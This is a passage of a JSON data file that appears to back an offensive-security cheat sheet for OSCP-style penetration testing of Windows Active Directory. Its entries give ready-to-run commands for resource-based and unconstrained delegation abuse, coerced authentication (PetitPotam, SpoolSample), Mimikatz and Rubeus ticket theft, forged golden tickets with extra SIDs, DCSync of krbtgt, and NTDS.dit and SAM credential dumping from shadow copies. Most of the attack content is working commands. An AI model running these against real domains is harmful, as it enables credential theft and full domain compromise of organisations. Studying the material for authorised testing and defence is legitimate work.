            "code": "# If eligible for JIT\nRequest-PAMRoleActivation -RoleId <RoleGUID>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Current JIT Sessions",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-PAMRoleAssignment | Where-Object { $_.Status -eq \"Active\" }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Extend Session Duration",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If can modify PAM policies, increase TTL for persistent access.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Abuse Approval Workflow",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Potential attack vectors:\n- Compromise approver account\n- Approve your own requests\n- Request access when approver is away",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Resource-Based Constrained Delegation",
    "title": "Exploiting RBCD",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Create Computer Account",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-Module .\\Powermad.ps1\nNew-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)"
          },
          {
            "lang": "bash",
            "code": "impacket-addcomputer -computer-name FakeComputer$ -computer-pass 'Password123!' -dc-ip <DC-IP> <Domain>/<User>:<Password>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 2: Get New Computer's SID",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADComputer FakeComputer | Select-Object SID"
          },
          {
            "lang": "bash",
            "code": "impacket-getPac -targetUser FakeComputer$ <Domain>/<User>:<Password>"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 3: Configure RBCD on Target",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Using PowerView\n$ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | Select-Object -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer <TargetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
          },
          {
            "lang": "bash",
            "code": "impacket-rbcd -delegate-to <TargetComputer>$ -delegate-from FakeComputer$ -dc-ip <DC-IP> -action write <Domain>/<User>:<Password>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 4: Request Service Ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe s4u /user:FakeComputer$ /rc4:<FakeComputerNTHash> /impersonateuser:Administrator /msdsspn:cifs/<TargetComputer>.<Domain> /ptt"
          },
          {
            "lang": "bash",
            "code": "impacket-getST -spn cifs/<TargetComputer>.<Domain> -impersonate Administrator -dc-ip <DC-IP> <Domain>/FakeComputer$:'Password123!'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 5: Access Target",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass <TargetComputer>.<Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "NetExec with RBCD Module",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <User> -p '<Pass>' -M rbcd -o action=write delegate_from=YOURPC$ delegate_to=<TargetComputer>$"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Automated RBCD attack using **NetExec**.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Validate Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <Target> -u Administrator -k --use-kcache"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -k -no-pass <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**Troubleshooting:**\n- **Can't create machine account:** (MAQ = 0): Use existing machine account you control\n- **RBCD write fails:** (No write permission): Verify ACLs in **BloodHound**\n- **getST.py fails:** (S4U issues): Check account types, target must be computer\n- **Ticket doesn't work:** (Wrong SPN or hostname): Use FQDN, verify DNS",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Exploiting Unconstrained Delegation",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 2: Monitor for Incoming TGTs",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe monitor /interval:5 /filteruser:<TargetUser>"
          },
          {
            "lang": "powershell",
            "code": "# Monitor for DC machine account\nRubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 3: Capture TGT via Printer Bug",
        "substeps": [
          {
            "title": "PetitPotam (EFSRPC)",
            "codes": [
              {
                "lang": "bash",
                "code": "python3 PetitPotam.py <UnconstServer> <DC>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "# On attacker's unconstrained delegation server\nRubeus.exe monitor /interval:5\n\n# Trigger authentication from DC\nSpoolSample.exe <DC> <UnconstDelegServer>"
          },
          {
            "lang": "bash",
            "code": "printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Force target to authenticate to compromised server.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Step 4: Extract TGTs with Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nsekurlsa::tickets /export"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": true,
        "local": false
      },
      {
        "title": "Step 5: Pass-the-Ticket with Captured TGT",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe ptt /ticket:<Base64Ticket>"
          },
          {
            "lang": "bash",
            "code": "mimikatz.exe\nkerberos::ptt <TicketFile>.kirbi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**Step 1** - Compromise the unconstrained delegation machine",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Export Tickets from Memory [Remote]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\mimikatz.exe \"sekurlsa::tickets /export\" \"exit\"\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# Export specific ticket types\n.\\Rubeus.exe dump /nowrap\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# Dump current user's tickets\n.\\Rubeus.exe triage\n```"
      }
    ]
  },
  {
    "category": "Intra-Forest Attacks",
    "title": "Extra SIDs Attack (Golden Ticket)",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Attack Requirements",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Required information for this attack:\n- **krbtgt** hash from child domain\n- **Enterprise Admins SID** from root domain\n- **SID** of child domain",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Get Required Information",
        "substeps": [
          {
            "title": "Get Child Domain SID",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainSID"
              },
              {
                "lang": "bash",
                "code": "whoami /user"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Enterprise Admins SID",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainGroup -Identity \"Enterprise Admins\" -Domain <RootDomain> | Select-Object objectsid"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Enterprise Admins SID format: `<RootDomainSID>-519`",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Get krbtgt Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "mimikatz.exe\nlsadump::dcsync /domain:<ChildDomain> /user:krbtgt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Forge Golden Ticket with ExtraSID",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nkerberos::golden /user:Administrator /domain:<ChildDomain> /sid:<ChildDomainSID> /krbtgt:<KrbtgtHash> /sids:<EnterpriseAdminsSID> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Access Root Domain DC",
        "codes": [
          {
            "lang": "bash",
            "code": "dir \\\\<RootDC>\\c$"
          },
          {
            "lang": "bash",
            "code": "PsExec.exe \\\\<RootDC> cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Rubeus Extra SID",
        "codes": [
          {
            "lang": "bash",
            "code": "Rubeus.exe golden /user:Administrator /domain:<ChildDomain> /sid:<ChildSID> /krbtgt:<Hash> /sids:<EASid> /ptt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Inter-Forest Attacks",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Add Enterprise Admins SID to golden ticket to compromise entire forest from child domain.",
        "variant": "danger"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Extract Credentials from Offline Files",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Extract NTDS.dit Hashes with secretsdump.py",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
          },
          {
            "lang": "bash",
            "code": "# After copying files to Kali\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Extract SAM Hashes with secretsdump.py",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Extract with Impacket (All Hives)",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Extract NTDS.dit from Shadow Copy",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Method 1: Copy from Shadow Copy Path",
        "codes": [
          {
            "lang": "powershell",
            "code": "# List shadow copies to find the path\nvssadmin list shadows\n\n# Copy NTDS.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\n\n# Copy SYSTEM registry hive (needed for decryption)\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Method 2: Using mklink (Symbolic Link)",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Create symbolic link to shadow copy\nmklink /d C:\\ShadowCopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n\n# Copy files\ncopy C:\\ShadowCopy\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\ncopy C:\\ShadowCopy\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM\n\n# Remove symbolic link\nrmdir C:\\ShadowCopy"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Method 3: Using robocopy",
        "codes": [
          {
            "lang": "powershell",
            "code": "robocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS C:\\Temp ntds.dit\nrobocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config C:\\Temp SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "NTDS.dit contains all Active Directory credentials (domain controller only).",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Extract SAM and SYSTEM from Shadow Copy",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Copy SAM and SYSTEM",
        "codes": [
          {
            "lang": "powershell",
            "code": "# List shadow copies\nvssadmin list shadows\n\n# Copy SAM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\SAM\n\n# Copy SYSTEM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM\n\n# Copy SECURITY (optional, contains cached credentials)\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY C:\\Temp\\SECURITY"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "SAM contains local user password hashes.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "KeePass Password Manager",
    "title": "Extracting Hash with keepass2john",
    "tags": [],
    "steps": [
      {
        "title": "Basic Usage",
        "codes": [
          {
            "lang": "bash",
            "code": "keepass2john Database.kdbx > keepass.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Output",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Database:$keepass$*2*60000*0*d74e4a5..."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "The hash format includes the KeePass version, iteration count, and encrypted data.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Multiple Files",
        "codes": [
          {
            "lang": "bash",
            "code": "# Process multiple KDBX files\nfor file in *.kdbx; do\n    keepass2john \"$file\" >> all_keepass.hash\ndone"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "LDAP Enumeration",
    "title": "Extracting Useful Information",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Find User Email Addresses",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(objectClass=user)\" mail | grep mail:"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find User Descriptions (Often Contain Passwords)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName description | grep -B1 description:"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Administrators sometimes store passwords in user description fields.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Find Last Logon Times",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName lastLogon"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Password Last Set",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName pwdLastSet"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "File Dialog Navigation",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Address Bar Commands",
        "codes": [
          {
            "lang": "text",
            "code": "# Type in address bar of file dialog\nC:\\Windows\\System32\\cmd.exe\nshell:startup\nshell:system"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Network Paths",
        "codes": [
          {
            "lang": "text",
            "code": "\\\\127.0.0.1\\c$\\Windows\\System32\\\n\\\\localhost\\admin$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Evil-WinRM",
    "title": "File Operations",
    "tags": [],
    "steps": [
      {
        "title": "Upload Files to Target",
        "codes": [
          {
            "lang": "powershell",
            "code": "upload <LocalFile>"
          },
          {
            "lang": "powershell",
            "code": "upload <LocalFile> <RemotePath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Download Files from Target",
        "codes": [
          {
            "lang": "powershell",
            "code": "download <RemoteFile>"
          },
          {
            "lang": "powershell",
            "code": "download <RemoteFile> <LocalPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "If no path is specified, files are uploaded/downloaded to the current directory.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Fileless Lateral Movement",
    "title": "Fileless Lateral Movement",
    "tags": [
      "Lateral_Movement",
      "Windows"
    ],
    "steps": [
      {
        "title": "Common Protocols",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **WMI** - Windows Management Instrumentation\n- **WinRM** - Windows Remote Management\n- **DCOM** - Distributed COM\n- **SMB** - Named pipes and admin shares\n- **RPC** - Remote Procedure Calls"
          }
        ]
      },
      {
        "title": "Authentication Methods",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Password** - Plaintext credentials\n- **NTLM Hash** - Pass-the-hash\n- **Kerberos Ticket** - Pass-the-ticket"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "MITRE - Lateral Movement",
        "url": "https://attack.mitre.org/tactics/TA0008/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Execute code on remote systems without writing files to disk. Uses legitimate Windows protocols and COM objects.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Filesystem Exploration",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Find Writable Directories",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -writable -type d 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Common Writable Locations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Writable directories:\n- **/tmp** - Usually writable\n- **/var/tmp** - Persists across reboots\n- **/dev/shm** - RAM-based, fast",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Save Files via Browser",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Right-click, Save As, Navigate to /tmp",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Final Checklist",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Pre-Exam Preparation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- [ ] Earned 10 bonus points (lab report + exercises)\n- [ ] Practiced on TJNull's list machines\n- [ ] Comfortable with manual exploitation\n- [ ] Can stabilize shells without Metasploit\n- [ ] Know BloodHound enumeration\n- [ ] Understand pivoting (Chisel/Ligolo-NG)\n- [ ] Have documentation template ready\n- [ ] Know common privilege escalation vectors\n- [ ] Practiced time management\n- [ ] Tested all tools in lab environment\n- [ ] VPN connection tested\n- [ ] Workspace organized\n- [ ] Snacks and water prepared\n- [ ] Sleep schedule adjusted"
          }
        ]
      },
      {
        "title": "Exam Day Checklist",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- [ ] Connect to VPN\n- [ ] Verify all machines are reachable\n- [ ] Start documentation template\n- [ ] Begin initial enumeration\n- [ ] Focus on one machine at a time\n- [ ] Take breaks every 4 hours\n- [ ] Document everything in real-time\n- [ ] Capture all required screenshots\n- [ ] Verify proof.txt and local.txt screenshots\n- [ ] Review documentation before exam ends"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Constrained Delegation",
    "title": "Find Constrained Delegation",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "BloodHound Queries",
        "codes": [
          {
            "lang": "cypher",
            "code": "# Users\nMATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate\n\n# Computers\nMATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate\n\n# All\nMATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerView Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Users\nGet-DomainUser -TrustedToAuth\n\n# Computers\nGet-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Active Directory Module",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "LDAP Search",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC-IP> -D \"<User>@<Domain>\" -w \"<Password>\" -b \"DC=<Domain>,DC=<TLD>\" \"(&(objectCategory=computer)(msds-allowedtodelegateto=*))\" msds-allowedtodelegateto"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "NetExec Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Find All Delegation Types",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Find Unconstrained Delegation Computers",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "BloodHound Query",
        "codes": [
          {
            "lang": "cypher",
            "code": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerView Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainComputer -Unconstrained | Select-Object name,dnshostname"
          },
          {
            "lang": "powershell",
            "code": "Get-NetComputer -Unconstrained"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Active Directory Module",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADComputer -Filter {TrustedForDelegation -eq $true}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "LDAP Search",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC-IP> -D \"<User>@<Domain>\" -w \"<Password>\" -b \"DC=<Domain>,DC=<TLD>\" \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "NetExec Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-findDelegation <Domain>/<User>:<Pass> -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Find All Delegation Types",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --unconstrained"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Finding .git Directories",
    "tags": [],
    "steps": [
      {
        "title": "Web Server Discovery",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if .git is exposed\ncurl http://<TargetIP>/.git/\ncurl http://<TargetIP>/.git/config\ncurl http://<TargetIP>/.git/HEAD"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Locations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "http://<target>/.git/\nhttp://<target>/.git/config\nhttp://<target>/.git/HEAD\nhttp://<target>/.git/logs/HEAD\nhttp://<target>/.git/index"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Directory Fuzzing",
        "codes": [
          {
            "lang": "bash",
            "code": "# Using ffuf\nffuf -u http://<TargetIP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403\n\n# Using gobuster\ngobuster dir -u http://<TargetIP> -w /usr/share/wordlists/dirb/common.txt -x git"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Important File Locations",
    "title": "Finding Files in Windows (CTF Style)",
    "tags": [],
    "steps": [
      {
        "title": "Quick Directory Tree View",
        "codes": [
          {
            "lang": "bash",
            "code": "cd C:\\Users\ntree /F"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
